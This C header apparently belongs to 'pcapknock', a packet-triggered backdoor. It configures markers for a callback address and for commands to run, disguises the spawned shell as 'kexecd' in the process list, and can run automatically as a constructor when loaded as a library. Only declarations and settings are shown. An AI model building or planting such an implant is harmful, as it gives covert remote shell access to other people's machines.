/*
 * pcapknock.h
 * Watch for trigger packets, take action
 * By J. Stuart McMurray
 * Created 20180308
 * Last Modified 20180310
 */

#ifndef HAVE_PCAPKNOCK_H
#define HAVE_PCAPKNOCK_H

#include <pcap.h>

/* DEVICE is the network device on which to capture */
#ifndef DEVICE
#define DEVICE "any"
#endif /* #ifndef DEVICE */

/* CBMARKER must surround the address used for a callback */
#ifndef CBMARKER
#define CBMARKER "CALLBACK"
#endif /* #ifndef CBMARKER */

/* CMDMARKER must surround the string to run as a command */
#ifndef CMDMARKER
#define CMDMARKER "COMMAND"
#endif /* #ifndef CMDMARKER */

/* SHELLNAME is the name visible in the process list for a spawned shell */
#ifndef SHELLNAME
#define SHELLNAME "kexecd"
#endif /* #ifndef SHELLNAME */

/* MAXKNOCK is the maximum size of a string sent in a knock packet */
#ifndef MAXKNOCK
#define MAXKNOCK 4096
#endif /* #ifndef MAXKNOCK */

/* CLMAXFD is the highest file descriptor to close.  There's probably a better
 * way to do this, but not without adding size. */
#ifndef CLMAXFD
#define CLMAXFD 10240
#endif /* #ifndef CLMAXFD */

/* Be a constructor if we're a library */
#ifdef CONSTRUCTOR
__attribute__((constructor))
#endif /* #ifdef CONSTRUCTOR */
/* pcapknock starts a pthread which listens for knocks using pcap */
int pcapknock(void);

/* ERROUT may be defined to output error messages to stderr */
#endif /* #ifndef HAVE_PCAPKNOCK_H */
